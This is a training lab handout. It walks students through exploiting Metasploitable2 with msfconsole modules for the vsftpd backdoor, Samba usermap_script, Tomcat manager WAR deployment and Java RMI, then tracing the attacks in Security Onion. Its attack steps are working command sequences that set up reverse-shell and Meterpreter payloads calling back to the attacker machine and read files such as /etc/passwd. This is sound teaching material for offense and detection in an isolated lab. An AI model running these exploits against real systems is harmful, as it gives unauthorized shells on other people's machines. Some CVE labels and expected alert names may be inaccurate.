# Activity: Exploiting Metasploitable2 with MSFconsole and Investigating with Security Onion

## Overview

In this activity, you will use Kali Linux's Metasploit Framework (`msfconsole`) to exploit well-known vulnerabilities on the Metasploitable2 virtual machine. After successful exploitation, you will switch to Security Onion to analyze the network traffic and alerts generated by the attack.

This hands-on exercise teaches both offensive exploitation techniques and defensive security monitoring.

**Prerequisites:** You have successfully completed Steps 1-12 of the installation guide. Your VMs are configured, running, and communicating:

- Kali at `10.10.1.10`
- Metasploitable at `10.10.1.20`
- Security Onion monitoring the `intnet` network

**Estimated time:** 60-90 minutes

## Part A - Preparation and Reconnaissance (Review)

Before exploiting, ensure your environment is ready.

### Step A1 - Verify VM Status and Connectivity

On your Windows 11 host:

1. Open **VirtualBox**.
2. Ensure the following VMs are powered on, not just saved:
   - Kali Linux
   - Metasploitable2
   - Security Onion

In the **Kali Linux** terminal, log in with `kali / kali`, then run:

```bash
# Check your IP address
ip a show eth1

# Verify you can reach Metasploitable
ping -c 4 10.10.1.20

# Verify you can reach Security Onion management interface (adjust IP as needed)
ping -c 2 192.168.56.101
```

**Expected output:** All pings should be successful.

If not, review network settings from the installation guide.

### Step A2 - Quick Reconnaissance with Nmap (Review)

Run a service version scan to refresh your memory of available services:

```bash
nmap -sV -O 10.10.1.20
```

Take note of the following vulnerable services that will be targeted:

| Port | Service | Known Vulnerability |
| --- | --- | --- |
| 21 | FTP `vsftpd 2.3.4` | Backdoor command execution |
| 445 | Samba `3.0.20` | Remote command injection (`CVE-2007-2447`) |
| 1099 | Java RMI | Unrestricted deserialization |
| 8180 | Apache Tomcat | Default credentials and WAR deployment |

Record these ports. You will need them for your submission.

## Part B - Exploitation with MSFconsole

### Step B1 - Launch MSFconsole

In the Kali terminal, run:

```bash
sudo msfconsole
```

Why `sudo`?
Some Metasploit modules require root privileges for certain payloads and network operations.

Wait for the banner to appear. You will see a prompt ending with:

```text
msf6 >
```

### Step B2 - Exploit 1: vsftpd 2.3.4 Backdoor

This specific version of `vsftpd` contains a backdoor triggered by a `:)` sequence in the username. Metasploit has a module for this.

At the `msf6` prompt, type:

```text
search vsftpd
```

Identify the module for version `2.3.4` backdoor.

Load the module:

```text
use exploit/unix/ftp/vsftpd_234_backdoor
```

View required options:

```text
show options
```

You will see that `RHOSTS` is required. `RPORT` is already set to `21`.

Set the target:

```text
set RHOSTS 10.10.1.20
```

Optional: View available payloads:

```text
show payloads
```

The default payload, `cmd/unix/interact`, is fine for this exercise.

Execute the exploit:

```text
run
```

or

```text
exploit
```

What should happen:
If successful, you will get a command shell on Metasploitable. You should see a prompt like `id` or `$`. You are now connected as `root`.

Verify access:

```text
whoami
id
hostname
pwd
```

Exit the shell, but do not close `msfconsole`:

```text
exit
```

You will return to the `msf6` prompt.

**Note:** This exploit works instantly. If it fails, the backdoor may not be triggered. Try running it twice.

### Step B3 - Exploit 2: Samba usermap Script (`CVE-2007-2447`)

Samba version `3.0.20` is vulnerable to command injection via the username map script functionality.

At the `msf6` prompt:

```text
search samba usermap
```

Load the module:

```text
use exploit/multi/samba/usermap_script
```

View options:

```text
show options
```

Set the target:

```text
set RHOSTS 10.10.1.20
```

View payloads if desired:

```text
show payloads
```

For this exploit, use a more interactive payload.

Set a reverse shell payload:

```text
set payload cmd/unix/reverse_netcat
```

Check payload options:

```text
show options
```

You will see that `LHOST` is required.

Set `LHOST`:

```text
set LHOST 10.10.1.10
```

Execute:

```text
run
```

What should happen:
A reverse shell connection should be established from Metasploitable back to Kali. You will see a session open.

Interact with the session:

If a session ID is created, for example `session 1 opened`, type:

```text
sessions -i 1
```

Verify access:

```text
whoami
ls -la /home
cat /etc/passwd | head -5
```

Exit the session:

```text
exit
```

### Step B4 - Exploit 3: Tomcat Manager Default Credentials (`CVE-2009-3843`)

Apache Tomcat on Metasploitable has the manager application enabled with default credentials `tomcat:tomcat`. You can deploy a malicious WAR file to gain a shell.

At the `msf6` prompt:

```text
search tomcat manager
```

Load the module:

```text
use exploit/multi/http/tomcat_mgr_deploy
```

View options:

```text
show options
```

Set the required options:

```text
set RHOSTS 10.10.1.20
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
```

Set the payload:

```text
set payload java/meterpreter/reverse_tcp
set LHOST 10.10.1.10
```

Execute:

```text
run
```

What should happen:
Metasploit uploads a malicious WAR file, deploys it, executes the payload, and opens a Meterpreter session.

Interact with the Meterpreter session:

```text
sessions -i 2
```

Basic Meterpreter commands to try:

```text
getuid
sysinfo
shell
```

Type `exit` to return from shell to Meterpreter, then `exit` again to return to `msfconsole`.

### Step B5 - Exploit 4: Java RMI Deserialization (`CVE-2017-3241`)

The Java RMI service on port `1099` is vulnerable to remote code execution via deserialization of untrusted data.

At the `msf6` prompt:

```text
search java rmi
```

Load the module:

```text
use exploit/multi/misc/java_rmi_server
```

Set options:

```text
set RHOSTS 10.10.1.20
set RPORT 1099
set payload java/meterpreter/reverse_tcp
set LHOST 10.10.1.10
```

Execute:

```text
run
```

Expected result:
A Meterpreter session on Metasploitable.

### Step B6 - Post-Exploitation: Gather System Information

While you have an active session, try these Meterpreter commands:

```text
getuid
sysinfo
ifconfig
ps
search -f *.conf
```

To background a session and keep it alive while returning to `msfconsole`:

```text
background
```

List all active sessions:

```text
sessions
```

Re-enter a session:

```text
sessions -i <session_id>
```

Exit `msfconsole` when done:

```text
exit
```

## Part C - Investigation with Security Onion

Now that you have performed exploitation, analyze what Security Onion captured during these attacks.

### Step C1 - Access the Security Onion Web Interface

On your Windows 11 host, open a browser such as **Edge** or **Chrome**.

Navigate to the Security Onion management IP.
If you forgot it, use the Security Onion terminal:

```bash
ip a show enp0s3
```

Look for an IP in the range `192.168.56.x`.

In the Windows browser, type:

```text
https://192.168.56.101
```

Replace the IP with your actual Security Onion address.

Accept the security warning by selecting **Advanced -> Proceed**.

Log in with:

- Username: `admin@securityonion.com`
- Password: `admin1234`

### Step C2 - Navigate to the Investigation Interface

By default, Security Onion opens to the Kibana or OpenSearch Dashboards interface.

1. Look for the main navigation menu, typically a hamburger icon in the top left.
2. Navigate to:
   `Dashboards -> Network Overview` or `Alerts Dashboard`
3. Set the time range in the top right corner:
   - Click the clock icon
   - Select `Last 1 hour` or use `Absolute` time to cover your exploitation period

### Step C3 - Identify Nmap Scan Alerts

Your earlier Nmap scan should have triggered Suricata alerts.

In the search bar, type:

```text
host:10.10.1.20 AND event.type:alert
```

or use the filter:

```text
source.ip:10.10.1.10 AND destination.ip:10.10.1.20
```

Look for signatures containing:

- `ET SCAN NMAP`
- `ET SCAN Suspicious inbound to MySQL`
- `SURICATA STREAM`

Take a screenshot showing:

- the timestamp matching your scan time
- the signature name
- the source and destination IPs

### Step C4 - Analyze FTP Backdoor Exploit Traffic

Search for the `vsftpd` exploit:

```text
destination.ip:10.10.1.20 AND destination.port:21
```

Or filter by alert signature:

```text
alert.signature.id: *FTP*
```

What to look for:

- the `:)` sequence in the username field, if packet payload is visible
- subsequent shell command traffic

For deeper analysis, click an alert and select **View in PCAP** to inspect the actual packets.

### Step C5 - Analyze Samba Exploit Traffic

Search for Samba-related alerts:

```text
destination.port:445
```

or

```text
alert.signature:*samba* OR alert.signature:*usermap*
```

Expected signatures:

- `ET EXPLOIT Samba usermap script command injection attempt`
- `ET SHELLCODE Meterpreter reverse shell detected`

### Step C6 - Analyze Tomcat Exploit Traffic

Search for Tomcat manager activity:

```text
destination.port:8180 AND http.request.uri:*/manager*
```

or

```text
url:*WAR* OR url:*deploy*
```

What to look for:

- HTTP `POST` requests to `/manager/deploy`
- WAR file uploads containing binary data
- `200 OK` responses followed by reverse shell traffic

### Step C7 - Create a Timeline of Events

In Security Onion, use the **Discover** tab:

1. Go to **Discover**.
2. Set the time range to cover your activity.
3. Add these filters:

```text
destination.ip:10.10.1.20
source.ip:10.10.1.10
```

4. Sort by timestamp in ascending order.

You should see events in approximately this order:

| Time | Event Type | Details |
| --- | --- | --- |
| T+0:00 | Nmap scan | Port scan detection |
| T+0:30 | FTP exploit | `vsftpd` backdoor trigger |
| T+1:00 | Samba exploit | `usermap` command injection |
| T+1:30 | Tomcat exploit | WAR deployment |
| T+2:00 | RMI exploit | Java deserialization |

### Step C8 - Export Evidence (for Submission)

To export search results as CSV:

1. In the **Discover** tab, click the **Share** icon.
2. Select **CSV Reports**.
3. Choose **Formatted CSV**.
4. Click **Generate**.
5. Save the file to `D:\YourLastName\` for inclusion in your submission.

## Part D - Cleanup and Shutdown

### Step D1 - Terminate Metasploit Sessions

In the Kali terminal, if you are still in `msfconsole`, run:

```text
sessions -K
```

This kills all active sessions.

Exit `msfconsole`:

```text
exit
```

### Step D2 - Shut Down VMs Properly

In Kali Linux:

```bash
sudo shutdown now
```

In Metasploitable2:

```bash
sudo shutdown now
```

In Security Onion:

```bash
sudo shutdown now
```

Wait for each VM to fully power off before closing VirtualBox.

### Step D3 - Verify No VMs Running

In VirtualBox, ensure all VMs show as **Powered Off**, not `Running` or `Saved`.

## Troubleshooting Guide

| Problem | Possible Solution |
| --- | --- |
| `msfconsole` command not found | Kali may be outdated. Run `sudo apt update && sudo apt install metasploit-framework` |
| Exploit fails with `Connection refused` | Target service may not be running. On Metasploitable, run `sudo nmap -p 21,445,8180,1099 localhost` |
| Reverse shell not connecting | Verify `LHOST` is set to `10.10.1.10`, which is Kali's internal IP. Check that no firewall is blocking the port. |
| No alerts in Security Onion | Ensure the time range is correct. Check that the Security Onion monitor interface is `enp0s8` attached to `intnet` with promiscuous mode set to `Allow All`. |
| Security Onion web interface will not load | Verify the VM is running. Check the IP with `ip a`. Try `https://`, not `http://`, and accept the certificate warning. |
| Session dies immediately | Some payloads are unstable. Try a different payload such as `cmd/unix/bind_netcat`. |
| Can't see session in `sessions -l` | The session may have disconnected. Background it with `Ctrl + Z` before exiting. |
